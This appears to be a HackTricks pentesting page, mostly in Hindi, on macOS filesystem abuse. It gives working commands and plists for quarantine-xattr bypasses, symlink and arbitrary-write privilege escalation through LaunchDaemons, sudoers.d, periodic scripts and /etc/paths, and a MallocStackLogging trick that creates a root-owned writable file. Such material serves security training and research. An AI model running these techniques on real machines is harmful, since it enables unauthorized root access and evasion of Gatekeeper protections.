# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permissions combinations

Permissions in a **directory**:

- **read** - आप **directory entries** को **enumerate** कर सकते हैं
- **write** - आप directory में **files** को **delete/write** कर सकते हैं और आप **खाली फोल्डर्स** को **delete** कर सकते हैं।
- लेकिन आप **non-empty folders** को **delete/modify** नहीं कर सकते जब तक कि आपके पास उस पर write permissions न हों।
- आप **folder का नाम** **modify** नहीं कर सकते जब तक कि आप उसके मालिक न हों।
- **execute** - आपको directory को **traverse** करने की **अनुमति** है - यदि आपके पास यह अधिकार नहीं है, तो आप इसके अंदर या किसी भी subdirectories में कोई files तक पहुँच नहीं सकते।

### Dangerous Combinations

**कैसे root द्वारा स्वामित्व वाली एक file/folder को overwrite करें**, लेकिन:

- पथ में एक माता-पिता **directory owner** उपयोगकर्ता है
- पथ में एक माता-पिता **directory owner** एक **users group** है जिसमें **write access** है
- एक users **group** को **file** पर **write** access है

पिछले किसी भी संयोजन के साथ, एक हमलावर **inject** कर सकता है एक **sym/hard link** अपेक्षित पथ पर एक विशेषाधिकार प्राप्त मनमाना write प्राप्त करने के लिए।

### Folder root R+X Special case

यदि एक **directory** में files हैं जहाँ **केवल root को R+X access** है, तो वे **किसी और के लिए उपलब्ध नहीं हैं**। इसलिए एक भेद्यता जो **एक file को स्थानांतरित करने की अनुमति देती है जिसे एक उपयोगकर्ता द्वारा पढ़ा जा सकता है**, जिसे उस **restriction** के कारण नहीं पढ़ा जा सकता, इस folder से **किसी अन्य में**, इन files को पढ़ने के लिए दुरुपयोग किया जा सकता है।

Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

यदि एक विशेषाधिकार प्राप्त प्रक्रिया **file** में डेटा लिख रही है जिसे **lower privileged user** द्वारा **control** किया जा सकता है, या जिसे एक lower privileged user द्वारा **पहले बनाया गया** हो। उपयोगकर्ता बस इसे एक Symbolic या Hard link के माध्यम से **दूसरे file** की ओर **point** कर सकता है, और विशेषाधिकार प्राप्त प्रक्रिया उस file पर लिखेगी।

Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.

## .fileloc

**`.fileloc`** एक्सटेंशन वाली files अन्य applications या binaries की ओर इशारा कर सकती हैं ताकि जब उन्हें खोला जाए, तो application/binary वही होगा जो निष्पादित होगा।\
Example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## मनमाने FD

यदि आप एक **प्रक्रिया को उच्च विशेषाधिकारों के साथ एक फ़ाइल या फ़ोल्डर खोलने** के लिए मजबूर कर सकते हैं, तो आप **`crontab`** का दुरुपयोग करके `/etc/sudoers.d` में एक फ़ाइल खोलने के लिए **`EDITOR=exploit.py`** का उपयोग कर सकते हैं, ताकि `exploit.py` को `/etc/sudoers` के अंदर फ़ाइल का FD मिल सके और इसका दुरुपयोग कर सके।

उदाहरण के लिए: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## संगरोध xattrs ट्रिक्स से बचें

### इसे हटाएं
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

यदि एक फ़ाइल/फ़ोल्डर में यह अपरिवर्तनीय विशेषता है, तो उस पर xattr डालना संभव नहीं होगा।
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs mount

एक **devfs** माउंट **xattr** का समर्थन नहीं करता, अधिक जानकारी के लिए [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

यह ACL फ़ाइल में `xattrs` जोड़ने से रोकता है
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** फ़ाइल प्रारूप एक फ़ाइल को उसकी ACEs सहित कॉपी करता है।

[**स्रोत कोड**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) में यह देखना संभव है कि xattr के अंदर संग्रहीत ACL पाठ प्रतिनिधित्व जिसे **`com.apple.acl.text`** कहा जाता है, उसे डिकंप्रेस की गई फ़ाइल में ACL के रूप में सेट किया जाएगा। इसलिए, यदि आपने एक एप्लिकेशन को **AppleDouble** फ़ाइल प्रारूप में एक ज़िप फ़ाइल में संकुचित किया है जिसमें एक ACL है जो अन्य xattrs को इसमें लिखने से रोकता है... तो क्वारंटाइन xattr एप्लिकेशन में सेट नहीं किया गया था:

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) की जांच करें।

इसे दोहराने के लिए, हमें पहले सही acl स्ट्रिंग प्राप्त करने की आवश्यकता है:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Not really needed but I leave it there just in case:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## कोड सिग्नेचर बायपास करें

Bundles में फ़ाइल **`_CodeSignature/CodeResources`** होती है जिसमें **bundle** में हर एक **file** का **hash** होता है। ध्यान दें कि CodeResources का hash भी **executables** में **embedded** होता है, इसलिए हम इसके साथ भी छेड़छाड़ नहीं कर सकते।

हालांकि, कुछ फ़ाइलें हैं जिनके सिग्नेचर की जांच नहीं की जाएगी, इनमें plist में omit कुंजी होती है, जैसे:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
यह संभव है कि आप CLI से एक संसाधन के हस्ताक्षर की गणना कर सकें:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

एक उपयोगकर्ता एक कस्टम dmg को माउंट कर सकता है जो कुछ मौजूदा फ़ोल्डरों के ऊपर भी बनाया गया है। इस तरह आप कस्टम सामग्री के साथ एक कस्टम dmg पैकेज बना सकते हैं:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
आमतौर पर macOS डिस्क को `com.apple.DiskArbitrarion.diskarbitrariond` Mach सेवा से जोड़ता है (जो `/usr/libexec/diskarbitrationd` द्वारा प्रदान की जाती है)। यदि LaunchDaemons plist फ़ाइल में `-d` पैरामीटर जोड़ा जाए और पुनः प्रारंभ किया जाए, तो यह `/var/log/diskarbitrationd.log` में लॉग संग्रहीत करेगा।\
हालांकि, `com.apple.driver.DiskImages` kext के साथ सीधे संवाद करने के लिए `hdik` और `hdiutil` जैसे उपकरणों का उपयोग करना संभव है।

## मनमाने लेखन

### आवधिक शेल स्क्रिप्ट

यदि आपकी स्क्रिप्ट को **शेल स्क्रिप्ट** के रूप में व्याख्यायित किया जा सकता है, तो आप **`/etc/periodic/daily/999.local`** शेल स्क्रिप्ट को ओवरराइट कर सकते हैं, जो हर दिन ट्रिगर होगी।

आप इस स्क्रिप्ट के निष्पादन को **`sudo periodic daily`** के साथ **फेक** कर सकते हैं।

### डेमन

एक मनमाना **LaunchDaemon** लिखें जैसे **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** जिसमें एक plist हो जो एक मनमानी स्क्रिप्ट निष्पादित करे जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
बस स्क्रिप्ट `/Applications/Scripts/privesc.sh` उत्पन्न करें जिसमें **कमांड** हों जिन्हें आप रूट के रूप में चलाना चाहते हैं।

### Sudoers फ़ाइल

यदि आपके पास **मनमाना लेखन** है, तो आप फ़ोल्डर **`/etc/sudoers.d/`** के अंदर एक फ़ाइल बना सकते हैं जो आपको **sudo** विशेषाधिकार देती है।

### PATH फ़ाइलें

फ़ाइल **`/etc/paths`** मुख्य स्थानों में से एक है जो PATH env वेरिएबल को भरती है। इसे ओवरराइट करने के लिए आपको रूट होना चाहिए, लेकिन यदि **privileged process** से कोई स्क्रिप्ट कुछ **कमांड बिना पूर्ण पथ** के निष्पादित कर रही है, तो आप इस फ़ाइल को संशोधित करके इसे **हाइजैक** कर सकते हैं।

आप नए फ़ोल्डरों को `PATH` env वेरिएबल में लोड करने के लिए **`/etc/paths.d`** में भी फ़ाइलें लिख सकते हैं।

## अन्य उपयोगकर्ताओं के रूप में लिखने योग्य फ़ाइलें उत्पन्न करें

यह एक फ़ाइल उत्पन्न करेगा जो रूट की है और जिसे मैं लिख सकता हूँ ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh))। यह privesc के रूप में भी काम कर सकता है:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX साझा मेमोरी

**POSIX साझा मेमोरी** POSIX-अनुरूप ऑपरेटिंग सिस्टम में प्रक्रियाओं को एक सामान्य मेमोरी क्षेत्र तक पहुँचने की अनुमति देती है, जो अन्य अंतःप्रक्रिया संचार विधियों की तुलना में तेज़ संचार को सुविधाजनक बनाती है। इसमें `shm_open()` के साथ एक साझा मेमोरी ऑब्जेक्ट बनाना या खोलना, `ftruncate()` के साथ इसका आकार सेट करना, और इसे प्रक्रिया के पते के स्थान में `mmap()` का उपयोग करके मैप करना शामिल है। प्रक्रियाएँ फिर सीधे इस मेमोरी क्षेत्र से पढ़ और लिख सकती हैं। समवर्ती पहुँच को प्रबंधित करने और डेटा भ्रष्टाचार को रोकने के लिए, समन्वय तंत्र जैसे म्यूटेक्स या सेमाफोर का अक्सर उपयोग किया जाता है। अंततः, प्रक्रियाएँ `munmap()` और `close()` के साथ साझा मेमोरी को अनमैप और बंद करती हैं, और वैकल्पिक रूप से `shm_unlink()` के साथ मेमोरी ऑब्जेक्ट को हटा देती हैं। यह प्रणाली विशेष रूप से उन वातावरणों में कुशल, तेज IPC के लिए प्रभावी है जहाँ कई प्रक्रियाओं को साझा डेटा तक तेजी से पहुँचने की आवश्यकता होती है।

<details>

<summary>उत्पादक कोड उदाहरण</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>उपभोक्ता कोड उदाहरण</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS संरक्षित वर्णनकर्ता

**macOS संरक्षित वर्णनकर्ता** एक सुरक्षा विशेषता है जो macOS में उपयोगकर्ता अनुप्रयोगों में **फाइल वर्णनकर्ता संचालन** की सुरक्षा और विश्वसनीयता को बढ़ाने के लिए पेश की गई है। ये संरक्षित वर्णनकर्ता फाइल वर्णनकर्ताओं के साथ विशिष्ट प्रतिबंधों या "गार्ड" को जोड़ने का एक तरीका प्रदान करते हैं, जिन्हें कर्नेल द्वारा लागू किया जाता है।

यह विशेषता **अनधिकृत फाइल पहुंच** या **रेस कंडीशंस** जैसी सुरक्षा कमजोरियों की कुछ श्रेणियों को रोकने के लिए विशेष रूप से उपयोगी है। ये कमजोरियाँ तब होती हैं जब, उदाहरण के लिए, एक थ्रेड एक फाइल विवरण तक पहुँच रहा है जिससे **दूसरे कमजोर थ्रेड को उस पर पहुँच मिलती है** या जब एक फाइल वर्णनकर्ता एक कमजोर बाल प्रक्रिया द्वारा **विरासत में ली जाती है**। इस कार्यक्षमता से संबंधित कुछ कार्य हैं:

- `guarded_open_np`: एक गार्ड के साथ FD खोलें
- `guarded_close_np`: इसे बंद करें
- `change_fdguard_np`: एक वर्णनकर्ता पर गार्ड ध्वज बदलें (यहां तक कि गार्ड सुरक्षा को हटाना)

## संदर्भ

- [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)

{{#include ../../../../banners/hacktricks-training.md}}
